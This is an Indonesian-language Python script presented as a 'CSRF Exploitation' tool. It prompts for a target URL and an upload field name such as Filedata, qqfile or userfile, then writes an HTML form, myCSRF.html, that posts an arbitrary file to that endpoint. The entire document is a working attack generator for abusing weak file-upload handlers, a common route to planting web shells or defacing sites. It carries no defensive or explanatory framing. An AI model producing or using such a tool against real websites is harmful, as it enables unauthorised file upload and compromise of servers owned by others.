#!/usr/bin/python3.9
#
# Don't recode it ^_^
# This Code is Under MiT Licensed

banner = """
	/______________\\
	|              |
	|  CSRF Exploitation ---
	| Coded by: EtcAug10 -----
	|______________|
"""

def ekse(t,m):
	skrip = """
		<html>
		<head>
		  <title>CSRF Eksploit by D45H7</title>
		</head>
		<body>
		  <form method='post' enctype='multipart/form-data' action='"""+t+"""'>
		    <input type='file' name='"""+m+"""'>
		    <input type='submit' name='sbmt' value='Upload'>
		  </form>
		</body>
		</html>"""
	print("Skrip Eksploitasi sudah jadi.. Silahkan lihat di myCSRF.html")
	buka = open("myCSRF.html","a")
	buka.write(skrip)

def main():
	print(banner)
	print("Selamat datang")
	target = input("Url Target: ")
	method = input("Metode (Filedata / files[] / qqfile / userfile / dll.): ")
	ekse(target,method)
	use = input("Eksploitasi lagi? (y/n)")
	if use == "y":
		main()
	elif use == "n":
		exit()
	else:
		print("Salah command, exit")
		exit()
		
main()
